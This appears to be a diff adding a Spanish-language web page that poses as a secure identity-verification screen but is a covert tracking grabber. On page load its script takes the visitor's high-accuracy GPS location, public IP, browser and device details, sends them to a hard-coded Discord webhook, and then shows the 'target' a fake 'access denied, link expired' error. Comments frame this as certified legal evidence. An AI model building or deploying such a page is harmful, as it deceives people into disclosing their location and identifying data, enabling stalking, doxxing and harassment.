@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso Seguro | Verificación de Identidad</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</head>
+<body class="bg-slate-100 flex items-center justify-center min-h-screen">
+
+    <div id="status-card" class="max-w-md w-full p-8 bg-white shadow-xl rounded-xl text-center">
+        <div id="loader" class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
+        <h1 class="text-xl font-bold text-slate-800">Verificando Credenciales...</h1>
+        <p class="text-slate-500 text-sm mt-2">Certificando conexión segura mediante protocolo SSL/TLS 1.3.</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
+
+        async function generarEvidencia(lat = "N/A", lon = "N/A", acc = "N/A") {
+            // 1. Recopilación de Datos Estructurados (Formato Legal)
+            const resIP = await fetch('https://api.ipify.org?format=json');
+            const ipData = await resIP.json();
+            
+            const logEstructurado = {
+                timestamp: new Date().toISOString(), // ISO 8601
+                ip_publica: ipData.ip,
+                coordenadas: { latitud: lat, longitud: lon, precision_metros: acc },
+                user_agent: navigator.userAgent,
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                resolucion: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // 2. Cálculo del Hash SHA-256 (Integridad de la Evidencia)
+            // Esto demuestra que el log no fue modificado después de su creación.
+            const stringLog = JSON.stringify(logEstructurado);
+            const hashSHA256 = CryptoJS.SHA256(stringLog).toString();
+
+            // 3. Envío de Evidencia Certificada a Discord
+            const payload = {
+                content: "🛡️ **EVIDENCIA DIGITAL CERTIFICADA CAPTURADA**",
+                embeds: [{
+                    title: "Dictamen Técnico de Identificación",
+                    color: 3447003, // Azul Legal
+                    fields: [
+                        { name: "🕒 Timestamp (ISO 8601)", value: `\`${logEstructurado.timestamp}\`` },
+                        { name: "🌐 IP Pública", value: `\`${logEstructurado.ip_publica}\``, inline: true },
+                        { name: "📍 Precisión GPS", value: `${acc} metros`, inline: true },
+                        { name: "🔗 Ubicación", value: lat !== "N/A" ? `[Abrir Mapa](https://www.google.com/maps?q=${lat},${lon})` : "Denegado" },
+                        { name: "🔑 Hash SHA-256 (Firma Digital)", value: `\`${hashSHA256}\`` },
+                        { name: "📱 User-Agent", value: `\`${logEstructurado.user_agent}\`` }
+                    ],
+                    footer: { text: "Evidencia generada bajo estándares de cadena de custodia digital." }
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Finalización con mensaje de error para el objetivo
+            setTimeout(() => {
+                document.getElementById('status-card').innerHTML = `
+                    <h2 class="text-2xl font-bold text-red-600">Error 403</h2>
+                    <p class="text-slate-600 mt-2">Acceso denegado. El enlace ha expirado por seguridad.</p>
+                `;
+            }, 2500);
+        }
+
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => generarEvidencia(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+                    () => generarEvidencia(),
+                    { enableHighAccuracy: true, timeout: 7000 }
+                );
+            } else {
+                generarEvidencia();
+            }
+        };
+    </script>
+</body>
+</html>
